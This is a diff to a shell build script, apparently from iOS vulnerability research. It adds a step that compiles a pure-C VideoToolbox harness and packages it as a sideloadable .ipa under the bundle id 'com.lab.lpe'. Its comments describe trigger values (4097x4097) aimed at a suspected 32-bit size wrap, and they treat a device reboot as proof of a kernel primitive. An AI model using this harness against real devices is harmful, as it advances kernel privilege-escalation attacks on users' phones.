@@ -398,3 +398,41 @@ cd dist5
 zip -q -r -X CGDECPURE.ipa Payload/CGDECPURE.app
 cd ..
 echo "[+] built dist5/CGDECPURE.ipa"
+
+# ---- VTDECPURE (O-D) - the kernel leg, pure C -----------------------------------
+# Same machinery as VTDEC (VT/CM calls untouched), pure-C report shell (no objc).
+# Fire: VTD_W=4097 VTD_H=4097 -> the 32-bit wrap candidate (2 MB alloc vs 4.3 GB
+# write). Process dies mid-report or device reboots = kernel primitive proof.
+APP14="dist5/Payload/VTDECPURE.app"
+mkdir -p "$APP14"
+if $CC -O0 -g -o "$APP14/VTDECPURE" vtdec_pure.c \
+    -framework VideoToolbox -framework CoreMedia -framework CoreVideo -framework CoreFoundation; then
+  echo "[+] VTDECPURE compiled (pure C, no Foundation)"
+else
+  echo "[!] VTDECPURE failed to compile - continuing without it"
+  rm -f "$APP14/VTDECPURE"
+fi
+cat > "$APP14/Info.plist" <<PLIST14
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>CFBundleExecutable</key><string>VTDECPURE</string>
+  <key>CFBundleIdentifier</key><string>com.lab.lpe</string>
+  <key>CFBundleName</key><string>VTDECPURE</string>
+  <key>CFBundleVersion</key><string>1.0</string>
+  <key>CFBundleShortVersionString</key><string>1.0</string>
+  <key>CFBundlePackageType</key><string>APPL</string>
+  <key>LSRequiresIPhoneOS</key><true/>
+  <key>MinimumOSVersion</key><string>16.0</string>
+  <key>UIDeviceFamily</key><array><integer>1</integer></array>
+  <key>UILaunchScreen</key><dict/>
+</dict>
+</plist>
+PLIST14
+codesign -s - --force "$APP14/VTDECPURE" 2>/dev/null || true
+rm -f dist5/VTDECPURE.ipa
+cd dist5
+zip -q -r -X VTDECPURE.ipa Payload/VTDECPURE.app
+cd ..
+echo "[+] built dist5/VTDECPURE.ipa"
